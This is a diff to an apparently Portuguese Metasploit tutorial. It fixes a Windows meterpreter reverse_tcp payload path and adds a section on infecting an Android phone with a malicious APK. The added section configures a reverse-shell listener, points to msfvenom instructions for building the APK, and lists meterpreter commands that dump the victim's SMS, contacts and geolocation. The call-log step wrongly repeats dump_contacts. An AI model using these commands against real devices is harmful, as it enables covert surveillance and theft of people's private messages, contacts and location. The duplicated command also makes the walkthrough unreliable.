@@ -123,7 +123,7 @@ msf exploit(seattlelab_pass) > show payloads
 Setando payload para ser utilizado:
 
 ```msf
-msf exploit(seattlelab_pass) > set payload windows/  meterpreter/reverse_tcp  
+msf exploit(seattlelab_pass) > set payload windows/meterpreter/reverse_tcp  
 msf exploit(seattlelab_pass) > show options  
 msf exploit(seattlelab_pass) > set LHOST 172.20.0.2  
 msf exploit(seattlelab_pass) > set LPORT 4444  
@@ -207,3 +207,59 @@ meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.0.101
 ```
 
 Output: ``[*] Local TCP relay created: 0.0.0.0:3389 >-> 192.168.0.101:3389``
+
+---
+
+## Infectando Android com APK malicioso
+
+1- Configure o MSF para receber conexão reversa:
+
+```msf
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload android/meterpreter/reverse_tcp
+msf exploit(handler) > set lport 443
+msf exploit(handler) > set lhost 192.168.0.111
+msf exploit(handler) > exploit
+```
+
+2- Gere o APK malicioso:
+
+Para gerar o APK malicioso siga o seguinte [link](https://github.com/BlackCat-Pentest/Linux-Docs/blob/master/Docs/msfvenom.md).
+
+3- Depois de instalado o APK malicioso no celular, o **meterpreter** será aberto e haverá várias opções de comandos que conseguimos listar com o comando **help**.
+
+Coleta de SMS:
+
+```msf
+meterpreter > dump_sms
+```
+
+Verificando geolocalização:
+
+```msf
+meterpreter > geolocate
+```
+
+```msf
+meterpreter > wlan_geolocate
+```
+
+*A opção **wlan_geolocate** verifica a localização com base na rede e não possui tanta precisão.*
+
+Verificando se o aparelho possui o usuário root ativado:
+
+```msf
+meterpreter > check_root
+```
+
+Verificando as ligações:
+
+```msf
+meterpreter > dump_contacts
+```
+
+Verificando os contatos:
+
+```msf
+meterpreter > dump_contacts
+```
